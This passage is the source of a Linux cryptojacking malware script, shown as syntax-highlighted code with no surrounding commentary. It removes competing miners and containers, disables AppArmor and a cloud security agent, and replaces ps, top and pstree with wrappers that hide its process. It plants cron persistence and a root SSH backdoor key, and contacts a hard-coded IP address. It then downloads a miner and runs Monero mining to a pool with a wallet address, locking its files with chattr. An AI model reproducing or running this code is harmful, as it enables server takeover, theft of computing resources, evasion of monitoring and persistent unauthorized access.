-rf /var/tmp/sustse3</span><br><span class="line">rm -rf /var/tmp/sustse</span><br><span class="line">rm -rf /var/tmp/moneroocean/</span><br><span class="line">rm -rf /var/tmp/devtool</span><br><span class="line">rm -rf /var/tmp/devtools</span><br><span class="line">rm -rf /var/tmp/play.sh</span><br><span class="line">rm -rf /var/tmp/systemctI</span><br><span class="line">rm -rf /var/tmp/.java</span><br><span class="line">rm -rf /var/tmp/1.sh</span><br><span class="line">rm -rf /var/tmp/conf.n</span><br><span class="line">rm -r /var/tmp/lib</span><br><span class="line">rm -r /var/tmp/.lib</span><br><span class="line">chattr -iau /tmp/lok</span><br><span class="line">chmod +700 /tmp/lok</span><br><span class="line">rm -rf /tmp/lok</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /tmp/kdevtmpfsi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/kdevtmpfsi</span><br><span class="line">chattr +i /tmp/kdevtmpfsi</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /tmp/redis2</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/redis2</span><br><span class="line">chattr +i /tmp/redis2</span><br><span class="line">chattr -ia /.Xll/xr</span><br><span class="line">&gt;/.Xll/xr</span><br><span class="line">chattr +ia /.Xll/xr</span><br><span class="line">chattr -ia /etc/trace</span><br><span class="line">&gt;/etc/trace</span><br><span class="line">chattr +ia /etc/trace</span><br><span class="line">chattr -ia /etc/newsvc.sh</span><br><span class="line">chattr -ia /etc/svc*</span><br><span class="line">chattr -ia /tmp/newsvc.sh</span><br><span class="line">chattr -ia /tmp/svc*</span><br><span class="line">&gt;/etc/newsvc.sh</span><br><span class="line">&gt;/etc/svcupdate</span><br><span class="line">&gt;/etc/svcguard</span><br><span class="line">&gt;/etc/svcworkmanager</span><br><span class="line">&gt;/etc/svcupdates</span><br><span class="line">&gt;/tmp/newsvc.sh</span><br><span class="line">&gt;/tmp/svcupdate</span><br><span class="line">&gt;/tmp/svcguard</span><br><span class="line">&gt;/tmp/svcworkmanager</span><br><span class="line">&gt;/tmp/svcupdates</span><br><span class="line">chattr +ia /etc/newsvc.sh</span><br><span class="line">chattr +ia /etc/svc*</span><br><span class="line">chattr +ia /tmp/newsvc.sh</span><br><span class="line">chattr +ia /tmp/svc*</span><br><span class="line">sleep 1</span><br><span class="line">chattr -ia /etc/phpupdate</span><br><span class="line">chattr -ia /etc/phpguard</span><br><span class="line">chattr -ia /etc/networkmanager</span><br><span class="line">chattr -ia /etc/newdat.sh</span><br><span class="line">&gt;/etc/phpupdate</span><br><span class="line">&gt;/etc/phpguard</span><br><span class="line">&gt;/etc/networkmanager</span><br><span class="line">&gt;/etc/newdat.sh</span><br><span class="line">chattr +ia /etc/phpupdate</span><br><span class="line">chattr +ia /etc/phpguard</span><br><span class="line">chattr +ia /etc/networkmanager</span><br><span class="line">chattr +ia /etc/newdat.sh</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /usr/lib/systemd/systemd-update-daily</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /usr/lib/systemd/systemd-update-daily</span><br><span class="line">chattr +i /usr/lib/systemd/systemd-update-daily</span><br><span class="line"><span class="comment">#yum install -y docker.io || apt-get install docker.io;</span></span><br><span class="line">docker ps | grep <span class="string">&quot;pocosow&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;gakeaws&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;azulu&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;auto&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;xmr&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;mine&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;slowhttp&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;bash.shell&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;entrypoint.sh&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;/var/sbin/bash&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker images -a | grep <span class="string">&quot;pocosow&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;gakeaws&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;buster-slim&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;hello-&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;azulu&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;registry&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;xmr&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;auto&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;mine&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;monero&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;slowhttp&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line"><span class="comment">#echo SELINUX=disabled &gt;/etc/selinux/config</span></span><br><span class="line">service apparmor stop</span><br><span class="line">systemctl <span class="built_in">disable</span> apparmor</span><br><span class="line">service aliyun.service stop</span><br><span class="line">systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aegis&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;Yun&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">rm -rf /usr/<span class="built_in">local</span>/aegis</span><br><span class="line">chattr -R -ia /var/spool/cron</span><br><span class="line">chattr -ia /etc/crontab</span><br><span class="line">chattr -R -ia /etc/cron.d</span><br><span class="line">chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">crontab -r</span><br><span class="line">rm -rf /var/spool/cron/*</span><br><span class="line">rm -rf /etc/cron.d/*</span><br><span class="line">rm -rf /var/spool/cron/crontabs</span><br><span class="line">rm -rf /etc/crontab</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kill_sus_proc()</span><br><span class="line">&#123;</span><br><span class="line">    ps axf -o <span class="string">&quot;pid&quot;</span>|<span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            ls -l /proc/<span class="variable">$procid</span>/exe | grep /tmp</span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 1 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">                    <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    ps axf -o <span class="string">&quot;pid %cpu&quot;</span> | awk <span class="string">&#x27;&#123;if($2&gt;=40.0) print $1&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">downloads()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/curl&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$1</span>,<span class="variable">$2</span></span><br><span class="line">        http_code=`curl -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/cd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        http_code=`cd1 -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wget&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wget --timeout=50 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                wget --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kill_miner_proc</span><br><span class="line">kill_sus_proc</span><br><span class="line"></span><br><span class="line">unlock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$rtdir</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;i am root&quot;</span></span><br><span class="line">        mkdir -p /root/.ssh</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;goto 1&quot;</span> &gt;&gt; /etc/zzhs</span><br><span class="line">        chattr -ia /etc/zzh*</span><br><span class="line">        chattr -ia /etc/newinit.sh*</span><br><span class="line">        chattr -ia /root/.ssh/authorized_keys*</span><br><span class="line">        chattr -R -ia /root/.ssh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/ps changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/ps /bin/ps.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/ps</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ps.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/ps</span><br><span class="line">        chmod +x /bin/ps</span><br><span class="line">                touch -d 20160825 /bin/ps</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/ps changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/top.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/top changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/top /bin/top.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/top</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/top</span><br><span class="line">        chmod +x /bin/top</span><br><span class="line">                touch -d 20160825 /bin/top</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/top changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/pstree.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/pstree changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/pstree /bin/pstree.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/pstree</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;pstree.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/pstree</span><br><span class="line">        chmod +x /bin/pstree</span><br><span class="line">                touch -d 20160825 /bin/pstree</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/pstree changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/chattr&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                chattrsize=`ls -l /bin/chattr | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$chattrsize</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$chattr_size</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">            yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;no need install chattr&quot;</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        rm -f <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        rm -f /etc/cron.d/zzh</span><br><span class="line">                        rm -f /etc/crontab</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; /etc/cron.d/zzh</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab</span><br><span class="line">                        <span class="built_in">echo</span> crontab created</span><br><span class="line">                        lock_cron</span><br><span class="line">        chmod 700 /root/.ssh/</span><br><span class="line">        <span class="built_in">echo</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">        chmod 600 /root/.ssh/authorized_keys</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver&quot;</span> &gt; /root/.ssh/authorized_keys</span><br><span class="line">        cd1 http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        wget -q -O- http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        cd1 http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        wget -q -O- http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        file=<span class="string">&quot;/etc/zzh&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/etc/zzh&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">            filesize1=`ls -l /etc/zzh | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">            <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$filesize1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$miner_size</span>&quot;</span> ] </span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                pkill -f zzh</span><br><span class="line">                rm /etc/zzh</span><br><span class="line">                downloads <span class="variable">$miner_url</span> /etc/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not need download&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            downloads <span class="variable">$miner_url</span> /etc/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    downloads <span class="variable">$sh_url</span> /etc/newinit.sh <span class="variable">$sh_url_backup</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    chmod 777 /etc/zzh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        ps.original -fe|grep zzh |grep -v grep</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ps -fe|grep zzh |grep -v grep</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">cd</span> /etc</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not root runing&quot;</span></span><br><span class="line">                sleep 5s</span><br><span class="line">                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span><br><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=2 )); <span class="keyword">then</span></span><br><span class="line">      cpunum=1</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=4)); <span class="keyword">then</span></span><br><span class="line">      cpunum=2</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=8)); <span class="keyword">then</span></span><br><span class="line">      cpunum=4</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=16)); <span class="keyword">then</span></span><br><span class="line">      cpunum=8</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=32)); <span class="keyword">then</span></span><br><span class="line">      cpunum=16</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=32</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&gt;64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=50</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">      cpunum=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=<span class="variable">$cpunum</span> -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.3910 -p x &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;root runing.....&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    chmod 777 /etc/zzh</span><br><span class="line">    chattr +ia /etc/zzh</span><br><span class="line">    chmod 777 /etc/newinit.sh</span><br><span class="line">    chattr +ia /etc/newinit.sh</span><br><span class="line">    chmod 600 /root/.ssh/authorized_keys</span><br><span class="line">    chattr +ia /root/.ssh/authorized_keys</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;goto 1&quot;</span> &gt; /tmp/zzhs</span><br><span class="line">    chattr -ia /tmp/zzh*</span><br><span class="line">    chattr -ia /tmp/newinit.sh*</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;/usr/bin/crontab&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /tmp/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        lock_cron</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        [[ <span class="variable">$cont</span> =~ <span class="string">&quot;newinit.sh&quot;</span> ]] || (crontab -l ; <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /tmp/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span>) | crontab -</span><br><span class="line">                        lock_cron</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/tmp/zzh&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span>    </span><br><span class="line">        filesize1=`ls -l /tmp/zzh | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$filesize1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$miner_size</span>&quot;</span> ] </span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                pkill -f zzh</span><br><span class="line">                rm /tmp/zzh</span><br><span class="line">                downloads <span class="variable">$miner_url</span> /tmp/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;no need download&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            downloads <span class="variable">$miner_url</span> /tmp/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;i am here&quot;</span></span><br><span class="line">    downloads <span class="variable">$sh_url</span> /tmp/newinit.sh <span class="variable">$sh_url_backup</span></span><br><span class="line"></span><br><span class="line">    ps -fe|grep zzh |grep -v grep</span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not tmp runing&quot;</span></span><br><span class="line">                <span class="built_in">cd</span> /tmp</span><br><span class="line">                chmod 777 zzh</span><br><span class="line">                sleep 5s</span><br><span class="line">                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span><br><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=2 )); <span class="keyword">then</span></span><br><span class="line">      cpunum=1</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=4)); <span class="keyword">then</span></span><br><span class="line">      cpunum=2</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=8)); <span class="keyword">then</span></span><br><span class="line">      cpunum=4</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span 